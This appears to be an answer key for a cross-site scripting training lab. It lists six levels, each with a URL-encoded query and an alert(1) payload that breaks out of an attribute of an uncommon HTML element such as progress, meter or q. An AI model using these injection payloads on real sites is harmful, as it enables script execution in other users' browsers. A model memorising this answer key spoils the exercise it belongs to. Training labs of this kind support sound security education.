# misc-context — solutions

Reflections inside lesser-used HTML element attributes (progress/meter/time/data/cite/q).

### misc-context-level1

`/misc-context/level1/?query=%22%20onmouseover=alert(1)%20x=%22`

- payload: `" onmouseover=alert(1) x="`
- context: `<progress title="...">` attribute breakout

### misc-context-level2

`/misc-context/level2/?query=%22%20onmouseover=alert(1)%20x=%22`

- payload: `" onmouseover=alert(1) x="`
- context: `<meter title="...">` attribute breakout

### misc-context-level3

`/misc-context/level3/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<time datetime="...">` attribute breakout

### misc-context-level4

`/misc-context/level4/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<data value="...">` attribute breakout

### misc-context-level5

`/misc-context/level5/?query=%22%20onmouseover=alert(1)%20x=%22`

- payload: `" onmouseover=alert(1) x="`
- context: `<cite title="...">` attribute breakout

### misc-context-level6

`/misc-context/level6/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<q cite="...">` attribute breakout
